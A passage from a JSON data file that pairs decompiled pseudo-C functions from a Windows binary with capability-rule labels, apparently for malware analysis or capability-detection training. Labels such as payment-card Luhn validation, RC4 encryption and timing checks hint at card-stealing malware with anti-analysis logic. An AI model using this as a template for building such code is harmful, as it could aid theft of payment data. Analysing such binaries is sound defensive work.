*(unaff_EBP + -0x28) = uVar3;\n                            }\n                        }\n                    }\n                }\n            }\n            (**(**(unaff_EBP + -0x24) + 8))(*(unaff_EBP + -0x24));\n        }\n        (**(**(unaff_EBP + -0x20) + 8))(*(unaff_EBP + -0x20));\n    }\n    *(unaff_EBP + -4) = 0xffffffff;\n    fcn.004105bb();\n    return;\n}\n",
        "token_count": 882
    },
    "0040e8dd": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040e8dd(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint var_208h;\n    \n    uVar2 = fcn.00407c34(0x412640, 6, 0xa98261ac, arg_8h, arg_ch);\n    fcn.00407d76(&var_208h, uVar2, arg_8h);\n    *0x433858 = fcn.00406c8c();\n    if (*0x433858 != 0) {\n        uVar2 = (**0x4133a4)(&var_208h);\n        (**0x4130b0)(&var_208h, uVar2);\n        uVar2 = fcn.00407c4b();\n        iVar1 = *0x4338bc;\n        *0x4338bc = *0x4338bc + 1;\n        *(*0x433858 + iVar1 * 4) = uVar2;\n    }\n    return 0;\n}\n",
        "token_count": 238
    },
    "0040f0bd": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nuint * fcn.0040f0bd(uint param_1, uint param_2, int32_t param_3)\n\n{\n    uint *puVar1;\n    int32_t unaff_EBX;\n    \n    puVar1 = fcn.00406c7f();\n    if (puVar1 != NULL) {\n        *(puVar1 + 1) = 0;\n        *puVar1 = 0;\n        puVar1[2] = 0;\n        puVar1[3] = *(param_3 + 4);\n        *(param_3 + 4) = puVar1;\n        puVar1[4] = param_1;\n        puVar1[5] = unaff_EBX;\n        sub.ntdll.dll_memcpy(puVar1 + 6, param_2, unaff_EBX * 2);\n    }\n    return puVar1;\n}\n",
        "token_count": 193
    },
    "0040f109": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nuint32_t __cdecl\nfcn.0040f109(int32_t *arg_8h, uint s2, int32_t n, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h)\n\n{\n    uint *puVar1;\n    int32_t unaff_EBX;\n    uchar auStack8 [3];\n    uint var_1h;\n    \n    _auStack8 = 0;\n    puVar1 = fcn.00406c7f();\n    if (puVar1 != NULL) {\n        *puVar1 = 0;\n        puVar1[2] = arg_1ch;\n        puVar1[3] = arg_20h;\n        if (*(unaff_EBX + 0x10) == NULL) {\n            *(unaff_EBX + 0xc) = puVar1;\n        }\n        else {\n            **(unaff_EBX + 0x10) = puVar1;\n        }\n        *(unaff_EBX + 0x10) = puVar1;\n        puVar1[1] = arg_8h;\n        puVar1[5] = arg_18h;\n        puVar1[4] = arg_14h;\n        puVar1[6] = n;\n        sub.ntdll.dll_memcpy(puVar1 + 7, s2, n * 2);\n        if (*arg_8h == 0) {\n            arg_8h[2] = puVar1;\n        }\n        puVar1 = *arg_8h + 1;\n        *arg_8h = puVar1;\n        *(unaff_EBX + 8) = *(unaff_EBX + 8) + 1;\n        _auStack8 = 0x1000000;\n    }\n    return puVar1 & 0xffffff00 | _auStack8 >> 0x18;\n}\n",
        "token_count": 431
    },
    "0040f6f1": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0040f6f1(uint32_t arg_8h, uint arg_ch)\n\n{\n    uint32_t in_ECX;\n    int32_t iVar1;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    iVar1 = 0;\n    if ((arg_8h & 1 << (in_ECX & 0x1f)) != 0) {\n        var_8h = CONCAT22(0x3a, in_ECX + 0x41);\n        var_4h = in_ECX & 0xffff0000;\n        iVar1 = fcn.0040efb3(&var_8h);\n        if (iVar1 != 0) {\n            (**0x413390)(arg_ch, &var_8h);\n        }\n    }\n    return iVar1;\n}\n",
        "token_count": 187
    },
    "0040f8b4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nbool __cdecl fcn.0040f8b4(uint *arg_8h, uint *arg_ch)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint var_44h;\n    uint *var_2ch;\n    uint var_28h;\n    uint *var_24h;\n    uint *var_20h;\n    uint *var_1ch;\n    uint *var_18h;\n    int32_t var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    cVar1 = fcn.00402699();\n    if (cVar1 != '\\0') {\n        fcn.00407c34(0x41272c, 0x1b, 0x26e5adc4);\n        fcn.00402664();\n        var_14h = (**0x4134a0)();\n    }\n    (**0x4133e4)(&var_44h);\n    var_ch = 0;\n    var_8h = 0;\n    var_10h = 0;\n    var_4h = 0;\n    var_28h = fcn.00409410();\n    var_2ch = &var_4h;\n    var_24h = &var_44h;\n    var_20h = &var_8h;\n    var_1ch = &var_10h;\n    var_18h = &var_ch;\n    fcn.0040f020(0, 0, 0x40f6c9, &var_2ch);\n    fcn.004094f1();\n    fcn.0040952e();\n    iVar2 = (**0x4134a0)();\n    cVar1 = fcn.00402699();\n    if (cVar1 != '\\0') {\n        fcn.00407c34(0x412748, 0x27, 0xd69e6f2d, iVar2 - var_14h);\n        fcn.00402664();\n    }\n    if (var_4h != 0) {\n        *arg_8h = var_8h;\n        *arg_ch = var_ch;\n    }\n    (**0x4133ec)(&var_44h);\n    return var_4h != 0;\n}\n",
        "token_count": 516
    },
    "0040f9ae": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong __cdecl fcn.0040f9ae(uint arg_8h, uint arg_ch)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint var_268h;\n    uint var_1a0h;\n    uint var_d8h;\n    uint32_t var_10h;\n    int32_t var_ch;\n    uint32_t var_8h;\n    int32_t var_4h;\n    \n    var_8h = 0;\n    var_4h = 0;\n    var_10h = 0;\n    var_ch = 0;\n    iVar2 = (**0x413438)(arg_ch, 0, &var_8h, &var_10h);\n    if (iVar2 != 0) {\n        cVar1 = fcn.00402699(arg_8h);\n        if (cVar1 != '\\0') {\n            (**0x413180)(var_8h, var_4h, &var_268h, 100);\n            (**0x413180)(var_10h, var_ch, &var_1a0h, 100);\n            (**0x413180)(var_8h - var_10h, (var_4h - var_ch) - (var_8h < var_10h), &var_d8h, 100);\n            uVar3 = fcn.00407c34(0x412770, 0x21, 0xd6f92b99, arg_ch, &var_268h, &var_1a0h, &var_d8h);\n            fcn.004025de(arg_8h, uVar3);\n        }\n    }\n    return CONCAT44((var_4h - var_ch) - (var_8h < var_10h), var_8h - var_10h);\n}\n",
        "token_count": 409
    },
    "0040fb44": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t fcn.0040fb44(void)\n\n{\n    uint32_t *puVar1;\n    code *pcVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    uint *unaff_EDI;\n    uint var_ch;\n    uint var_8h;\n    uint var_1h;\n    \n    pcVar2 = str.s_hn._0_4_;\n    uVar5 = 0;\n    var_1h._0_1_ = 0;\n    uVar3 = (*str.s_hn._0_4_)(*unaff_EDI, 0, 0);\n    uVar4 = uVar3;\n    if ((uVar3 != 0) && (var_1h._0_1_ = 1,  unaff_EDI[1] != 0)) {\n        do {\n            puVar1 = *(unaff_EDI[2] + uVar5 * 4);\n            uVar4 = fcn.0040698c(uVar3, *puVar1, 1, pcVar2);\n            *puVar1 = uVar4;\n            if (uVar4 == 0) {\n                var_1h._0_1_ = 0;\n                break;\n            }\n            uVar5 = uVar5 + 1;\n        } while (uVar5 < unaff_EDI[1]);\n    }\n    return uVar4 & 0xffffff00 | var_1h;\n}\n",
        "token_count": 356
    },
    "0040fdc1": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040fdc1(uint arg_8h)\n\n{\n    uint var_8h;\n    uint var_4h;\n    \n    var_8h = 0;\n    var_4h = 0;\n    fcn.0040fc7e(&var_8h, &var_4h, arg_8h);\n    fcn.0040fd75(arg_8h);\n    return;\n}\n",
        "token_count": 94
    },
    "0040fe15": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_20h\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __cdecl fcn.0040fe15(uint s2, int32_t arg_ch, int32_t arg_10h)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    int32_t unaff_EDI;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint s1;\n    uint var_ch;\n    uint var_8h;\n    uint var_1h;\n    \n    var_1h._0_1_ = 0;\n    puVar1 = fcn.0040fdf1();\n    if (puVar1 != NULL) {\n        var_28h = 0x208;\n        var_24h = 0x6801;\n        sub.ntdll.dll_memcpy(&s1, s2);\n        iVar2 = (**0x4137d8)(*0x4338e8, &var_28h, 0x1c, 0, 0, &var_8h);\n        if (iVar2 != 0) {\n            if (arg_10h != 0) {\n                sub.ntdll.dll_memcpy(arg_10h, arg_ch);\n                arg_ch = arg_10h;\n            }\n            iVar2 = (**0x4137d4)(var_8h, 0, 1, 0, arg_ch, &var_ch);\n            var_1h._0_1_ = iVar2 != 0;\n            (**0x4137e0)(var_8h);\n        }\n        puVar1 = &s1;\n        if (unaff_EDI != 0) {\n            do {\n                *puVar1 = 0;\n                puVar1 = puVar1 + 1;\n                unaff_EDI = unaff_EDI + -1;\n            } while (unaff_EDI != 0);\n        }\n    }\n    return puVar1 & 0xffffff00 | var_1h;\n}\n",
        "token_count": 478
    },
    "0040fec1": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.0040fec1(uint param_1, uint param_2)\n\n{\n    char cVar1;\n    int32_t arg_10h;\n    \n    arg_10h = fcn.00406c7f();\n    if (arg_10h != 0) {\n        cVar1 = fcn.0040fe15(param_1, param_2, arg_10h);\n        if (cVar1 == '\\0') {\n            fcn.00406d25();\n            arg_10h = 0;\n        }\n    }\n    return arg_10h;\n}\n",
        "token_count": 131
    },
    "004101b2": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004101b2(uint arg_8h)\n\n{\n    char cVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_ch = 0;\n    cVar1 = fcn.00410004();\n    if (cVar1 != '\\0') {\n        fcn.00407c1d(0x412864, 0x11, 0xb473b597);\n        fcn.00402cec();\n        uVar2 = fcn.00402e0b();\n        iVar3 = fcn.00401127(uVar2);\n        if (iVar3 != 0) {\n            var_8h = 0;\n            iVar3 = fcn.00401127(iVar3);\n            if (iVar3 != 0) {\n                var_4h = 0;\n                var_10h = 0;\n                iVar3 = (*str.4_tg._0_4_)(0x10001, 8, iVar3, var_8h, 0x8000, 0, &var_4h, &var_10h);\n                if (iVar3 != 0) {\n                    (**0x4137a4)(*0x4338ec, 1, var_4h, &var_ch);\n                    (**0x4134d4)(var_4h);\n                }\n                fcn.00406d25();\n            }\n            fcn.00406d25();\n        }\n    }\n    return var_ch;\n}\n",
        "token_count": 354
    },
    "0041026d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nuint32_t __cdecl fcn.0041026d(uint arg_8h, uint arg_ch, uint *arg_10h, int32_t *arg_14h)\n\n{\n    ushort uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    int32_t iVar5;\n    uchar auStack8 [3];\n    uint var_1h;\n    \n    _auStack8 = 0;\n    iVar2 = fcn.0040392d(0, 0);\n    iVar3 = fcn.0040392d(0, 0);\n    puVar4 = fcn.00406c7f();\n    if (puVar4 != NULL) {\n        uVar1 = fcn.0040392d(0, 0);\n        *puVar4 = uVar1;\n        uVar1 = fcn.0040392d(0, 0);\n        *(puVar4 + 2) = uVar1;\n        iVar5 = fcn.0040ffa1(arg_8h, 0);\n        if (iVar5 != 0) {\n            iVar5 = fcn.0040ffa1(arg_ch, 0);\n            if (iVar5 != 0) {\n                *arg_14h = iVar2 + 4 + iVar3;\n                *arg_10h = puVar4;\n                _auStack8 = 0x1000000;\n                puVar4 = arg_10h;\n                goto code_r0x004102f5;\n            }\n        }\n        puVar4 = fcn.00406d6b();\n    }\ncode_r0x004102f5:\n    return puVar4 & 0xffffff00 | _auStack8 >> 0x18;\n}\n",
        "token_count": 401
    },
    "00410467": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t fcn.00410467(void)\n\n{\n    uint arg_ch;\n    uint arg_8h;\n    uint32_t uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint var_d0h;\n    uint32_t var_8h;\n    uint var_1h;\n    \n    var_1h._0_1_ = 0;\n    arg_ch = fcn.00407c34(0x412878, 0xb, 0x2ef07160);\n    arg_8h = fcn.00407c34(0x412884, 0x1f, 0x25a7a049);\n    uVar1 = fcn.0040fefa(arg_8h, arg_ch);\n    if (uVar1 != 0) {\n        var_8h = uVar1;\n        iVar2 = (**0x413150)(uVar1, 0x2d);\n        if (iVar2 != 0) {\n            (**0x413174)(&var_d0h, uVar1, (iVar2 - uVar1 >> 1) + 1);\n            (**0x413448)(0x104, 0x4339b8);\n            (**0x4133a0)(0x4339b8, &var_d0h);\n            iVar2 = iVar2 + 2;\n            iVar3 = (**0x413150)(iVar2, 0x2d);\n            if (iVar3 != 0) {\n                (**0x413174)(0x433bc0, iVar2, (iVar3 - iVar2 >> 1) + 1);\n                iVar3 = iVar3 + 2;\n                iVar2 = (**0x413150)(iVar3, 0x2d);\n                if (iVar2 != 0) {\n                    (**0x413174)(0x4338f0, iVar3, (iVar2 - iVar3 >> 1) + 1);\n                    iVar2 = iVar2 + 2;\n                    iVar3 = (**0x413150)(iVar2, 0x2d);\n                    if (iVar3 != 0) {\n                        (**0x413174)(0x433c88, iVar2, (iVar3 - iVar2 >> 1) + 1);\n                        var_1h._0_1_ = 1;\n                    }\n                }\n            }\n        }\n        uVar1 = fcn.00406d25();\n    }\n    return uVar1 & 0xffffff00 | var_1h;\n}\n",
        "token_count": 580
    },
    "0040c043": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040c043(int32_t hWnd)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    iVar2 = (**0x4130ac)();\n    if (iVar2 != hWnd) {\n        var_4h = 0;\n        var_ch = 8;\n        var_8h = 0;\n        iVar2 = (**0x4130b8)(0x48, 8, &var_ch, 0);\n        if ((iVar2 != 0) && (var_8h != 0)) {\n            var_4h = var_8h;\n            var_ch = 8;\n            var_8h = 0;\n            (**0x4130b8)(0x49, 8, &var_ch, 0);\n        }\n        pcVar1 = _sym.imp.USER32.dll_SendMessageW;\n        (*_sym.imp.USER32.dll_SendMessageW)(hWnd, 0x112, 0xf020, 0);\n        (*pcVar1)(hWnd, 0x112, 0xf120, 0);\n        (*_sym.imp.USER32.dll_SetFocus)(hWnd);\n        (*_sym.imp.USER32.dll_SetForegroundWindow)(hWnd);\n        if (var_4h != 0) {\n            var_8h = var_4h;\n            var_ch = 8;\n            (**0x4130b8)(0x49, 8, &var_ch, 0);\n        }\n    }\n    return;\n}\n",
        "token_count": 353
    },
    "0040f671": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.0040f671(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h, \n            uint arg_24h)\n\n{\n    uchar *puVar1;\n    uint uVar2;\n    \n    puVar1 = fcn.00406c76();\n    if (puVar1 != NULL) {\n        uVar2 = fcn.00407c4b();\n        *(puVar1 + 8) = uVar2;\n        *(puVar1 + 4) = arg_ch;\n        *(puVar1 + 0xc) = arg_10h;\n        *(puVar1 + 0x10) = arg_14h;\n        *(puVar1 + 0x14) = arg_18h;\n        *(puVar1 + 0x18) = arg_1ch;\n        *(puVar1 + 0x1c) = arg_20h;\n        *puVar1 = arg_24h;\n        fcn.004094ec(fcn.0040f528, puVar1);\n    }\n    return;\n}\n",
        "token_count": 259
    },
    "00402bd8": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nint32_t fcn.00402bd8(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    \n    iVar2 = 0;\n    cVar1 = fcn.00402a76();\n    if (cVar1 != '\\0') {\n        iVar2 = fcn.00402b11();\n        if (iVar2 != 0) {\n            *(iVar2 + 0x14) = *(in_EAX + 0x14);\n            *(iVar2 + 0x20) = *(in_EAX + 0x20);\n            *(iVar2 + 0x24) = *(in_EAX + 0x24);\n            *(iVar2 + 0x10) = *(in_EAX + 0x10);\n            *(iVar2 + 0x18) = 1;\n        }\n    }\n    return iVar2;\n}\n",
        "token_count": 197
    },
    "004063f9": {
        "rules": [
            "encode data using XOR"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004063f9(int32_t arg_8h, uint32_t arg_ch, int32_t arg_10h, uint32_t arg_14h)\n\n{\n    uchar uVar1;\n    uint32_t uVar2;\n    uint var_4h;\n    \n    (**0x4134a0)();\n    if (arg_10h != 0) {\n        uVar2 = 0;\n        if (arg_14h != 0) {\n            do {\n                uVar2 = uVar2 + 1;\n            } while (uVar2 < arg_14h);\n        }\n    }\n    uVar2 = 0;\n    if (arg_ch != 0) {\n        do {\n            uVar1 = fcn.004095c4();\n            *(uVar2 + arg_8h) = uVar1;\n            uVar2 = uVar2 + 1;\n        } while (uVar2 < arg_ch);\n    }\n    fcn.00406252();\n    return 0;\n}\n",
        "token_count": 226
    },
    "00406252": {
        "rules": [
            "encrypt data using RC4 KSA/c6eee0698c4b4bd09944ca66a2e4c269"
        ],
        "decompiled_code": "\nvoid fcn.00406252(void)\n\n{\n    char cVar1;\n    uchar uVar2;\n    int32_t iVar3;\n    int32_t unaff_EBX;\n    uint32_t uVar4;\n    uint32_t unaff_EDI;\n    \n    cVar1 = fcn.00408dfb();\n    if (cVar1 != '\\0') {\n        uVar4 = 0;\n        if ((*0x4335f0 == 0) && (iVar3 = (**0x4137dc)(0x4335f0, 0, 0, 1, 0xf0000040),  iVar3 == 0)) {\n            *0x4335f0 = 0;\n        }\n        iVar3 = (**0x4137f8)(*0x4335f0);\n        if ((iVar3 == 0) && (unaff_EDI != 0)) {\n            do {\n                uVar2 = fcn.004095c4();\n                *(uVar4 + unaff_EBX) = uVar2;\n                uVar4 = uVar4 + 1;\n            } while (uVar4 < unaff_EDI);\n        }\n    }\n    return;\n}\n",
        "token_count": 263
    },
    "00402c8f": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t fcn.00402c8f(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    iVar3 = 0;\n    cVar1 = fcn.00402a76();\n    if ((cVar1 != '\\0') && (*(in_EAX + 0x14) == 4)) {\n        for (iVar2 = *(in_EAX + 0x10); iVar2 != 0; iVar2 = *(iVar2 + 8)) {\n            iVar3 = iVar3 + 1;\n        }\n    }\n    return iVar3;\n}\n",
        "token_count": 143
    },
    "00402cb6": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t fcn.00402cb6(int32_t param_1)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    \n    iVar3 = 0;\n    cVar1 = fcn.00402a76();\n    iVar4 = iVar3;\n    if ((cVar1 != '\\0') && (*(in_EAX + 0x14) == 4)) {\n        iVar2 = *(in_EAX + 0x10);\n        while ((iVar4 = iVar3,  iVar2 != 0 && (iVar4 = iVar2,  param_1 != 0))) {\n            iVar2 = *(iVar2 + 8);\n            param_1 = param_1 + -1;\n        }\n    }\n    return iVar4;\n}\n",
        "token_count": 187
    },
    "00403988": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00403988(int32_t *param_1)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    ulong uVar4;\n    \n    if ((*param_1 != 0) && (param_1[1] != 0)) {\n        uVar4 = fcn.0040435e(*param_1);\n        iVar1 = uVar4;\n        if (iVar1 != 0) {\n            iVar3 = 0;\n            uVar2 = 0x80000000;\n            do {\n                if ((uVar2 & *((uVar4 >> 0x20) + -4 + iVar1 * 4)) != 0) break;\n                iVar3 = iVar3 + 1;\n                uVar2 = uVar2 >> 1;\n            } while (uVar2 != 0);\n            return iVar1 * 0x20 - iVar3;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 219
    },
    "004043b8": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint __fastcall fcn.004043b8(uint *param_1)\n\n{\n    int32_t in_EAX;\n    uint var_4h;\n    \n    if (in_EAX != 0) {\n        do {\n            in_EAX = in_EAX + -1;\n            param_1[in_EAX] = 0;\n        } while (in_EAX != 0);\n    }\n    return *param_1;\n}\n",
        "token_count": 93
    },
    "0040677b": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nbool fcn.0040677b(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint unaff_ESI;\n    int32_t iVar3;\n    \n    cVar1 = fcn.00408e22();\n    if (cVar1 == '\\0') {\n        return false;\n    }\n    (**0x4134d8)();\n    iVar3 = 0;\n    while( true ) {\n        cVar1 = fcn.00406701(unaff_ESI);\n        if ((cVar1 != '\\0') || (0x14 < iVar3)) break;\n        iVar2 = (**0x4133c8)();\n        if (iVar2 == 2) {\n            return iVar2 == 2;\n        }\n        (**0x41347c)(10);\n        iVar3 = iVar3 + 1;\n    }\n    return cVar1 != '\\0';\n}\n",
        "token_count": 193
    },
    "00406972": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint32_t fcn.00406972(void)\n\n{\n    char *in_EAX;\n    char cVar1;\n    \n    cVar1 = *in_EAX;\n    do {\n        if (cVar1 == '.') break;\n        in_EAX = in_EAX + 1;\n        cVar1 = *in_EAX;\n    } while (cVar1 != '\\0');\n    return in_EAX & (*in_EAX != '.') - 1;\n}\n",
        "token_count": 100
    },
    "00406b4f": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint32_t fcn.00406b4f(void)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint8_t uVar4;\n    uint var_400h;\n    \n    iVar1 = *0x4335f4;\n    uVar4 = 0;\n    uVar2 = (**0x413464)(0xff, &var_400h);\n    if (((uVar2 != 0) && (uVar2 < 0x100)) && (uVar3 = 0,  uVar2 != 0)) {\n        do {\n            if ((&var_400h)[uVar3] == iVar1) {\n                uVar4 = 1;\n                break;\n            }\n            uVar3 = uVar3 + 1;\n        } while (uVar3 < uVar2);\n    }\n    return uVar2 & 0xffffff00 | uVar4;\n}\n",
        "token_count": 209
    },
    "00409d6a": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00409d6a(uint32_t arg_8h, uint arg_ch)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t unaff_EDI;\n    uint var_4h;\n    \n    uVar1 = (**0x4133a8)(arg_ch);\n    uVar3 = 0;\n    if (arg_8h != 0) {\n        do {\n            iVar2 = (**0x41315c)(uVar3 + unaff_EDI, arg_ch, uVar1);\n            if (iVar2 == 0) {\n                return uVar3 + unaff_EDI;\n            }\n            uVar3 = uVar3 + 1;\n        } while (uVar3 < arg_8h);\n    }\n    return 0;\n}\n",
        "token_count": 187
    },
    "0040c0f0": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint fcn.0040c0f0(void)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint var_1ch;\n    \n    *0x434700 = (**0x413090)(0x80000, L\"MyMainWnd\", 0, 0x10000000, *0x413a48 + 1, *0x413a4c + 1, 1, 1, 0, 0, *0x43470c, \n                             0);\n    if (*0x434700 != 0) {\n        fcn.0040c043(*0x434700);\n        (**0x41347c)(0x32);\n        pcVar1 = _sym.imp.USER32.dll_GetMessageW;\n        *0x434708 = 1;\n        while( true ) {\n            iVar2 = (*pcVar1)(&var_1ch, 0, 0, 0);\n            if (iVar2 == 0) break;\n            (**0x413080)(&var_1ch);\n            (**0x413098)(&var_1ch);\n        }\n    }\n    return 0;\n}\n",
        "token_count": 254
    },
    "0040df52": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.0040df52(uint param_1)\n\n{\n    uint32_t uVar1;\n    int32_t unaff_ESI;\n    \n    uVar1 = 0;\n    if ((unaff_ESI != 0) && (*(unaff_ESI + 8) != 0)) {\n        do {\n            fcn.0040ddfd(param_1);\n            uVar1 = uVar1 + 1;\n        } while (uVar1 < *(unaff_ESI + 8));\n    }\n    return;\n}\n",
        "token_count": 117
    },
    "0040e35c": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint fcn.0040e35c(uint param_1)\n\n{\n    uint32_t *puVar1;\n    uint32_t *puVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    \n    puVar2 = *0x4338e0;\n    uVar4 = 0;\n    if ((*0x4338e0 != NULL) && (**0x4338e0 != 0)) {\n        puVar1 = *0x4338e0 + 2;\n        do {\n            iVar3 = (**0x413140)(param_1, *(*puVar1 + uVar4 * 4));\n            if (iVar3 != 0) {\n                return 1;\n            }\n            uVar4 = uVar4 + 1;\n        } while (uVar4 < *puVar2);\n    }\n    return 0;\n}\n",
        "token_count": 191
    },
    "0040e54a": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.0040e54a(uint param_1)\n\n{\n    int32_t *piVar1;\n    uint32_t uVar2;\n    int32_t **ppiVar3;\n    char cVar4;\n    uint uVar5;\n    int32_t iVar6;\n    uint32_t uVar7;\n    \n    uVar5 = fcn.0040dc8a(param_1);\n    ppiVar3 = *0x4338b4;\n    uVar2 = *0x43386c;\n    uVar7 = 0;\n    if (*0x43386c != 0) {\n        do {\n            cVar4 = fcn.0040e332(uVar5);\n            if (cVar4 != '\\0') {\n                return;\n            }\n            uVar7 = uVar7 + 1;\n        } while (uVar7 < uVar2);\n    }\n    piVar1 = *ppiVar3;\n    iVar6 = fcn.00406c8c();\n    piVar1[2] = iVar6;\n    if (iVar6 == 0) {\n        *piVar1 = 0;\n    }\n    else {\n        *(iVar6 + *piVar1 * 4) = uVar5;\n        *piVar1 = *piVar1 + 1;\n    }\n    return;\n}\n",
        "token_count": 291
    },
    "0040f189": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint32_t fcn.0040f189(uint param_1)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint8_t uVar4;\n    uint32_t uVar5;\n    \n    uVar4 = 0;\n    uVar2 = fcn.0040dc8a(param_1);\n    uVar1 = *0x43386c;\n    uVar5 = 0;\n    uVar3 = uVar2;\n    if (*0x43386c != 0) {\n        do {\n            uVar3 = fcn.0040e332(uVar2);\n            if (uVar3 != '\\0') {\n                uVar4 = 1;\n                break;\n            }\n            uVar5 = uVar5 + 1;\n        } while (uVar5 < uVar1);\n    }\n    return uVar3 & 0xffffff00 | uVar4;\n}\n",
        "token_count": 210
    },
    "0040f50f": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.0040f50f(void)\n\n{\n    int32_t in_EAX;\n    \n    if (in_EAX != 0) {\n        do {\n            in_EAX = *(in_EAX + 0xc);\n            fcn.00406d25();\n        } while (in_EAX != 0);\n    }\n    return;\n}\n",
        "token_count": 76
    },
    "0040ff87": {
        "rules": [
            "contain loop"
        ],
